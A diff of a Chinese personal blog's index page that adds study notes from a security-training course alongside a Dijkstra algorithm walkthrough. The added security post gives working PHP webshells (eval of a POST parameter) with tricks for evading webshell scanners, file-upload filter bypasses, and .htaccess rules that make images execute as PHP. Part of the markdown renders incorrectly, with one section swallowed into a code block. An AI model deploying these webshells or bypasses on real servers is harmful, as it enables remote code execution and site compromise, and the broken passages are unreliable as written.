@@ -7,7 +7,112 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">108</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/16/%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/">有趣的小技巧</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-16</time><div class="content"><h2 id="通过禁用JS来实现直接进入管理员后台"><a href="#通过禁用JS来实现直接进入管理员后台" class="headerlink" title="通过禁用JS来实现直接进入管理员后台"></a>通过禁用JS来实现直接进入管理员后台</h2><ol>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">110</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/18/%E7%BB%95%E8%BF%87%E5%AF%B9php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/">绕过对php一句话木马查杀的方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><ol>
+<li><p>改变大小写，然后strlower()</p>
+</li>
+<li><p>文本反转：strrev()</p>
+</li>
+<li><p>点号分割字符串：”a”.”b”</p>
+</li>
+<li><p>数组：array(“a”,”b”);   $a[0].$a[1]</p>
+</li>
+<li><p>干扰函数：var_dump()、print_r()</p>
+</li>
+<li><p>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line">ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rg</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		@<span class="keyword">eval</span>($a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="keyword">new</span> rg;</span><br><span class="line">$key -&gt; ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>改cknife里的配置【base_64一下】</p>
+</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/">Dijkstra算法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-17</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><p>当我们要寻找无权重边的最短路径时，我们常用广度优先搜索，即第一次遇到结点x就是x的最短路径【如社交媒体上的好友推荐】。但对于那些有权重边的最优解，我们就不能再用广度优先搜索了，因为最先到达x并不能代表这条路径就是最优解，因为每条路径的权重不同。如下图所示：</p>
+<p>如果用广度优先搜索会先到达地点B，但地点B并不是最优解</p>
+<p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/2.jpg" alt="2"></p>
+<p>这时我们就需要用到<strong>Dijkstra</strong>算法了：</p>
+<h2 id="基本符号定义"><a href="#基本符号定义" class="headerlink" title="基本符号定义"></a>基本符号定义</h2><ol>
+<li>source：表示图中的起始点，缩写是s。</li>
+<li>weight[m，n]：表示从结点m到结点n的有向边之权重，如果m到n有多条边【一次到】则取权重最小的那条，缩写为w[m,n]。</li>
+<li>min_weight[m]：保存了从s到任意结点的最小权重，缩写为mw[m]。其中mw[s]=0。</li>
+<li>Finish：表示已经找到最小权重的结点之集合，一旦放入F，这个结点就不参与将来的计算，缩写为F。</li>
+</ol>
+<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
+<li>设置mw[s]=0。</li>
+<li>往集合F里添加结点s，F包含且仅包含结点s。</li>
+<li>假设结点s能直接到达的集合为M，对于其中的每一条边m，则把mw[m]设为w[s,m]，同时对其他s不能直接到的结点，将通路设为∞。</li>
+</ol>
+<h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><h3 id="1-查找最小mv"><a href="#1-查找最小mv" class="headerlink" title="1.查找最小mv"></a>1.查找最小mv</h3><p>当由一个点发散出去多个mw时，从mw数组中选择出其中的最小值【如mw[x]】，此最小值就是s到x</p>
+<p>的最小权重，将其放入F数组中。此后x结点就不必被考虑了。</p>
+<h3 id="2-更新权重"><a href="#2-更新权重" class="headerlink" title="2.更新权重"></a>2.更新权重</h3><p>然后看看新加入F的结点x，是不是可以直接到达其他结点。如果是，看看这些x到达其他通路的长度，是否比这些点之前的mw更小【mw[x]+w[x,y]&lt;mw[y]】，如果是，就替换这些点mw的值。</p>
+<p>重复以上两步，知道集合F包含途中所有结点。</p>
+<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>F</th>
+<th>mw</th>
+<th>已确定的mw</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>s</td>
+<td>mw[a]=0.5;mw[b]=0.3;mw[c]=0.2;mw[d]=0.4;其他mw=∞</td>
+<td>空集</td>
+</tr>
+<tr>
+<td>2</td>
+<td>s,c</td>
+<td>mw[a]=0.5;mw[b]=0.3;mw[d]=0.4;mw[f]=0.6;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2</td>
+</tr>
+<tr>
+<td>3</td>
+<td>s,c,b</td>
+<td>mw[a]=0.5;mw[d]=0.4;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3</td>
+</tr>
+<tr>
+<td>4</td>
+<td>s,c,b,d</td>
+<td>mw[a]=0.5;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4</td>
+</tr>
+<tr>
+<td>5</td>
+<td>s,c,b,d,f</td>
+<td>mw[a]=0.5;mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4</td>
+</tr>
+<tr>
+<td>6</td>
+<td>s,c,b,d,f,a</td>
+<td>mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;</td>
+</tr>
+<tr>
+<td>7</td>
+<td>s,c,b,d,f,a,e</td>
+<td>mw[h]=0.6;mv[g]=0.6</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5</td>
+</tr>
+<tr>
+<td>8</td>
+<td>s,c,b,d,f,a,e,h</td>
+<td>mv[g]=0.6</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>s,c,b,d,f,a,e,h,g</td>
+<td>空集</td>
+<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;mv[g]=0.6</td>
+</tr>
+</tbody></table>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>正在现学JAVA，之后补上。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/16/%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/">有趣的小技巧</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-16</time><div class="content"><h2 id="通过禁用JS来实现直接进入管理员后台"><a href="#通过禁用JS来实现直接进入管理员后台" class="headerlink" title="通过禁用JS来实现直接进入管理员后台"></a>通过禁用JS来实现直接进入管理员后台</h2><ol>
 <li><p>利用百度的高级搜索：想一些你觉得很多网站都会有的目录名和文件名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:&#x2F;admin&#x2F;main.html</span><br></pre></td></tr></table></figure>
 </li>
@@ -38,17 +143,30 @@
 </blockquote>
 <h3 id="一些文件上传的绕过方法"><a href="#一些文件上传的绕过方法" class="headerlink" title="一些文件上传的绕过方法"></a>一些文件上传的绕过方法</h3><h4 id="黑名单文件类型"><a href="#黑名单文件类型" class="headerlink" title="黑名单文件类型"></a>黑名单文件类型</h4><p><img src="/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
 <p>这时可以使用bp抓包，把名字改一下即可绕过。比如在.php后加个空格、改个大小写、用php5、phtml此类扩展名。</p>
-<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type</p>
+<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type：<a href="https://www.fujieace.com/penetration-test/file-upload-mime.html" target="_blank" rel="noopener">相关内容。</a></p>
 <h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><ol>
 <li>可以进用JS</li>
 <li>可以f12查看源代码，然后把有关验证JS的链接给删除。</li>
 </ol>
 <h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
 <p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断基本已经全部禁用</p>
-<h3 id="phar-zip协议"><a href="#phar-zip协议" class="headerlink" title="phar/zip协议"></a>phar/zip协议</h3><p>我们可能会遇到以下两种限制</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file) &amp;&amp; strtolower(substr($file, <span class="number">-4</span>)) == <span class="string">".jpg"</span>)&#123;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<p><a href="http://albatross-g.site/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/" target="_blank" rel="noopener">详情见我之前的文章。</a></p>
+<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>这题是在ctfhub里刷到的一道比较新颖的题【我见识短浅】，来好好的记录一下啦。</p>
+<p>这道题参考了<a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">这篇博客。</a></p>
+<blockquote>
+<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>根据上面文档的总结，修改.htaccess文件大致上有两种方法：</p>
+<ul>
+<li><pre><code>AddType application/x-httpd-php .png   //png就是修改为的文件类型
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  将此文件命名为.htaccess上传即可</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+&lt;FilesMatch &quot;muma.php&quot;&gt;   
+//双引号里就是匹配的文件名，也就是一句话木马的文件名【没有.php好像也可以】
+    SetHandler application/x-httpd-php
+&lt;FilesMatch&gt;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">二者选一上传之后再上传muma.png，这个配置文件就可以帮你把png改成php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文件包含</span><br><span class="line"></span><br><span class="line">### %00截断</span><br><span class="line"></span><br><span class="line">%00截断基本已经全部禁用，可以参考[这篇](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zpy1998zpy&#x2F;article&#x2F;details&#x2F;80545408)。</span><br><span class="line"></span><br><span class="line">### phar&#x2F;zip协议</span><br><span class="line"></span><br><span class="line">我们可能会遇到以下两种限制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</code></pre></li>
+</ul>
 <p>此时我们可以实行以下操作：</p>
 <ol>
 <li>创建一个1.php，里面写入php代码【phpinfo()】。</li>
@@ -431,138 +549,6 @@
 <li>后退时，取X栈顶压入Y</li>
 <li>前进时，取Y栈顶压入X</li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/01/mst-day1/">mst_day1</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-01</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;whois.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="大数据平台"><a href="#大数据平台" class="headerlink" title="大数据平台"></a>大数据平台</h2><p><img src="/2020/05/01/mst-day1/%E5%A4%A7%E6%95%B0%E6%8D%AE.png" alt="大数据"></p>
-<h2 id="bing接口查询"><a href="#bing接口查询" class="headerlink" title="bing接口查询"></a>bing接口查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure>
-
-<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>layer子域名挖掘机</p>
-<h1 id="高级搜索引擎"><a href="#高级搜索引擎" class="headerlink" title="高级搜索引擎"></a>高级搜索引擎</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intitle:baidu.com</span><br><span class="line">inurl:baidu.com</span><br><span class="line">intext:baidu.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/05/01/mst-day1/2.png" alt="2"></p>
-<h1 id="网站服务器信息"><a href="#网站服务器信息" class="headerlink" title="网站服务器信息"></a>网站服务器信息</h1><ul>
-<li>PING</li>
-<li>多地PING</li>
-<li>IP反查</li>
-</ul>
-<h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><ul>
-<li>URL编码：%+十六进制</li>
-<li>Base64编码</li>
-<li>HTML实体化编码：&amp;lt</li>
-</ul>
-<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>md5撞密</p>
-<h1 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h1><p><img src="/2020/05/01/mst-day1/1.png" alt="1"></p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/30/%E9%93%BE%E8%A1%A8/">链表</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-30</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
-<thead>
-<tr>
-<th></th>
-<th>数组</th>
-<th>链表</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>内存存储空间</td>
-<td>需要<strong>连续</strong>的内存空间来存储</td>
-<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
-</tr>
-<tr>
-<td>插入、删除数据</td>
-<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
-<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
-</tr>
-<tr>
-<td>访问</td>
-<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
-<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
-</tr>
-<tr>
-<td>CPU缓存机制</td>
-<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
-<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
-</tr>
-<tr>
-<td>大小固定</td>
-<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
-<td><strong>优：</strong>支持动态扩容。</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>对于CPU缓存机制【转】</p>
-<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
-<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
-</blockquote>
-<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
-<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
-<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
-<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
-<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
-<p>循环链表的尾结点指向链表的头结点</p>
-<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
-<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
-<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
-<p>比单链表多了一个prev前驱节点</p>
-<p><strong>优点：</strong>支持双向遍历</p>
-<p><strong>缺点：</strong>占用过多内存空间</p>
-<blockquote>
-<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
-</blockquote>
-<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
-<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
-<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
-<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
-<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
-<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
-<ol>
-<li>先进先出【FIFO：First In，First Out】</li>
-<li>最少使用策略【LFU：Least Frequently Used】</li>
-<li>最近最少使用策略【LRU：Least Recently Used】</li>
-</ol>
-<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
-<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
-<ol>
-<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
-<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
-</ol>
-<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
-<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
-<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
-<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
-<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
-<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>
-
-<p>特殊情况：向空链表插入第一个结点</p>
